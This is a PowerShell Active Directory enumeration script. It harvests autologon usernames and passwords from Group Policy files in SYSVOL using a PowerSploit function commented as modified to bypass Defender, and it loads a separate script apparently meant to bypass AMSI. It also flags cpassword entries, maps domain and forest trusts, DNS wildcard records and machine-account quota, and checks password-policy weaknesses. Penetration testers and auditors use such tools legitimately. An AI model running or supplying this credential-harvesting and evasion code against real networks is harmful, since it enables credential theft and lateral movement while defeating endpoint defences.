function Invoke-Domain{
    param (
        [string]$DomainController,
        [string]$Domain,
        [string]$DistinguishedName
    )
    function local:Get-GroupPolicyAutologon{
    <#
    Lightly modified to bypass defender
    .SYNOPSIS
        Retrieves password from Autologon entries that are pushed through Group Policy Registry Preferences.
        PowerSploit Function: Get-GPPAutologon
        Author: Oddvar Moe (@oddvarmoe)
        Based on Get-GPPPassword by Chris Campbell (@obscuresec) - Thanks for your awesome work!
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION
        Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password.
    .EXAMPLE
        PS C:\> Get-GPPAutolgon
        
        UserNames                                    File                                         Passwords                                  
        ---------                                    ----                                         ---------                                  
        {administrator}                              \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {PasswordsAreLam3}                    
        {NormalUser}                                 \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {ThisIsAsupaPassword}                    
    .EXAMPLE
        PS C:\> Get-GPPAutologon | ForEach-Object {$_.passwords} | Sort-Object -Uniq
        
        password
        password12
        password123
        password1234
        password1234$
        read123
        Recycling*3ftw!
    .LINK
        
        https://support.microsoft.com/nb-no/kb/324737
    #>
        
        [CmdletBinding()]
        Param ()
        
        #Some XML issues between versions
        Set-StrictMode -Version 2
        
        #define helper function to parse fields from xml files
        function Get-InnerFields 
        {
        [CmdletBinding()]
            Param (
                $File 
            )
        
            try 
            {
                $Filename = Split-Path $File -Leaf
                [xml] $Xml = Get-Content ($File)
    
                #declare empty arrays
                $Password = @()
                $UserName = @()
                
                #check for password and username field
                if (($Xml.innerxml -like "*DefaultPassword*") -and ($Xml.innerxml -like "*DefaultUserName*"))
                {
                    $props = $xml.GetElementsByTagName("Properties")
                    foreach($prop in $props)
                    {
                        switch ($prop.name) 
                        {
                            'DefaultPassword'
                            {
                                $Password += , $prop | Select-Object -ExpandProperty Value
                            }
                        
                            'DefaultUsername'
                            {
                                $Username += , $prop | Select-Object -ExpandProperty Value
                            }
                    }
    
                        Write-Verbose "Potential password in $File"
                    }
                             
                    #put [BLANK] in variables
                    if (!($Password)) 
                    {
                        $Password = '[BLANK]'
                    }
    
                    if (!($UserName))
                    {
                        $UserName = '[BLANK]'
                    }
                           
                    #Create custom object to output results
                    $ObjectProperties = @{'Passwords' = $Password;
                                          'UserNames' = $UserName;
                                          'File' = $File}
                        
                    $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                    Write-Verbose "The password is between {} and may be more than one value."
                    if ($ResultsObject)
                    {
                        Return $ResultsObject
                    } 
                }
            }
            catch {Write-Error $Error[0]}
        }
    
        try {
            #ensure that machine is domain joined and script is running as a domain account
            if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
                throw 'Machine is not a domain member or User is not a member of the domain.'
            }
        
            #discover potential registry.xml containing autologon passwords
            Write-Verbose 'Searching the DC. This could take a while.'
            $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
        
            if ( -not $XMlFiles ) {throw 'No preference files found.'}
    
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
        
            foreach ($File in $XMLFiles) {
                    $Result = (Get-InnerFields $File.Fullname)
                    Write-Output $Result
            }
        }
        catch {Write-Error $Error[0]}
    }
    #Set variables
    if(!$DomainController -or !$Domain){
        try{
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }catch{
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
    }
    if(!$Domain){
        $Domain = $current_domain.Name
    }
    Start-Transcript -Path "$(Get-Location)\$Domain.txt"
    Write-Output "[*] Domain = $Domain"

    if(!$DomainController){
        $DomainController = $current_domain.PdcRoleOwner.Name
    }
    Write-Output "[*] Domain Controller = $DomainController"

    if(!$DistinguishedName){
        $distinguished_name = "DC=$($Domain.replace(".", ",DC="))"
    }else{
        $distinguished_name = $DistinguishedName
    }
    Write-Output "[*] Distinguished Name = $distinguished_name"

    try{
        $adsi = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$distinguished_name"
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    try{
        . $PSScriptRoot\ASBBypass.ps1 | Out-Null
        . $PSScriptRoot\PowerView.ps1
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }

    #Check Trust https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
    Write-Output "`n[*] Looking for Domain Trust"
    $trust=Get-DomainTrust -Domain $Domain -DomainController $DomainController
    foreach($DomainTrust in $trust){
        if($DomainTrust.TrustAttributes -contains 'WITHIN_FOREST'){
            Write-Output "[-] Possible Parent-Child Trust Found" 
            Write-Output $DomainTrust
        }else{
            Write-Output "`n[*] Trust Found"
            Write-Output $DomainTrust
         }
    }
    Write-Output "`n[*] Looking for Forest Trust"
    try{
        Get-ForestTrust
    }catch{
        Write-Output "[-] Forest Trust Enumeration Failed" 
    }

    #Creds in SYSVOL
    Write-Output "`n[*] Looking for Passwords in Sysvol"
    try{
        $GPOpass=Get-GroupPolicyAutologon
        if($GPOpass){
            Write-Output "[-] GPOPassword Found in Sysvol" 
            Write-Output $GPOpass
        }
    }catch{
        Write-Output "[-] Testing GPOPassword in Sysvol Failed" 
    }
    if(Test-Path \\$domain\sysvol\$domain\policies\){
        $xmls=Get-ChildItem -r \\$domain\sysvol\$domain\policies\ -Include *.xml
        foreach($path in $xmls){
            [xml]$Xml = Get-Content ($Path.fullname)
            if($Xml.Groups.User.Properties.cpassword){
                Write-Output "[-] Credentials found: $($Path.fullname)" 
            }
        }
    }else{
        Write-Output "[-] Testing CPassword in Sysvol Failed" 
    }
    
    #Active Directory Integrated DNS Wilcard Record https://blog.netspi.com/exploiting-adidns/
    Write-Output "`n[*] Testing Active Directory Integrated DNS Wilcard Record"
    try{
        $zones=(Get-DomainDNSZone -Domain $Domain -DomainController $DomainController).ZoneName | where {$_ -notlike 'RootDNSServers'}
    }catch{
        Write-Output "[-] Testing for Active Directory Integrated DNS Wilcard Record Failed" 
    }
    foreach($zone in $zones){
        $records=(Get-DomainDNSRecord -ZoneName $zone -Domain $Domain -DomainController $DomainController).name
        $wildcard = $false
        foreach($record in $records){
            if($record -contains '*'){
                Write-Output "[+] Wildcard record exists for zone $zone" 
                $wildcard = $true
                break
            }
        }
        if(-not $wildcard){
        Write-Output "[-] Wildcard record does not exists for zone $zone" 
        }
    }
    
    #Machine Account Quota https://blog.netspi.com/machineaccountquota-is-useful-sometimes/
    Write-Output "`n[*] Testing ms-DS-MachineAccountQuota"
    Try{
        $maq = $adsi.Properties.'ms-DS-MachineAccountQuota'
        if($maq -eq '0') { 
            Write-Output "[+] Users are not allowed to add computer objects to the domain" 
        }else{ 
            Write-Output "[-] ms-DS-MachineAccountQuota is: $maq" 
        }
    }
    Catch{
        Write-Output "[-] Testing for ms-DS-MachineAccountQuota failed." 
    }

    #Domain Password Policy
    Write-Output "`n[*] Testing Domain Password Policy"
    try{
        $password_policy = (Get-DomainPolicy -Domain $Domain -DomainController $DomainController).SystemAccess
        $regv=(Get-DomainPolicy -Domain $Domain -DomainController $DomainController).RegistryValues
    }catch{
        Write-Output "[-] Testing for Domain Password Policy Failed." 
    }
    if($password_policy -and $regv){
        if([int]($password_policy).ClearTextPassword -eq 0){
            Write-Output "[+] Reversible Encryption Disabled" 
        }else{
            Write-Output "[-] Reversible Encryption Enabled" 
        }
        if([int]($password_policy).PasswordComplexity -eq 1){
            Write-Output "[+] Password Complexity Enabled" 
        }else{
            Write-Output "[-] Password Complexity Enabled Disabled" 
        }
        if([int]($password_policy).MinimumPasswordLength -ge 12){
            Write-Output "[+] Minimum Password Length: $($password_policy.MinimumPasswordLength)" 
        }else{
            Write-Output "[-] Minimum Password Length: $($password_policy.MinimumPasswordLength)" 
        }
        if([int]($password_policy).LockoutBadCount -eq 0){
            Write-Output "[-] Login tries before lockout is unlimimted" 
        }else{
            Write-Output "[+] Login tries before lockout set to: $($password_policy.LockoutBadCount)" 
        }
        $NoLMHash=$regv.'MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash'
        if($NoLMHash -notcontains '0'){
             Write-Output "[+] NoLMHash is enabled" 
        }else{
            Write-Output "[-] NoLMHash is disabled" 
        }
    }
   Stop-Transcript
}
#Invoke-Domain -DomainController 192.168.3.10 -Domain hackme.local